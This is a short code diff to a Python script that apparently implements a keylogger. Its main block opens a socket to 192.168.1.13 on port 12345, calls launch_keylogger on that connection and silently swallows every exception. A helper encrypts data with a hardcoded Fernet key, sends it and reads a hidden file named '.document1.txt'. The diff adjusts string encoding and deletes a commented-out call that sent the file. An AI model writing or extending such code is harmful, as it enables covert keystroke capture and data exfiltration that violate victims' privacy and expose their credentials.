@@ -45,7 +45,7 @@ def send_file_securely(client_socket):
         key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
  
         filename = get_filename()
-        encrypted_message = Fernet(key).encrypt(filename.encode())
+        encrypted_message = Fernet(key).encrypt(filename.encode('utf-8'))
         client_socket.send(encrypted_message)
 
         with open(".document1.txt", "r") as file:
@@ -63,14 +63,9 @@ def send_file_securely(client_socket):
 if __name__ == "__main__":
     try:
         mysocket = get_socket("192.168.1.13", 12345)
+        
         launch_keylogger(mysocket)
     except Exception:
         pass
 
-    """
-    try:
-        send_file_securely(mysocket)
-    except KeyboardInterrupt:
-        kill_server()
-    """
 
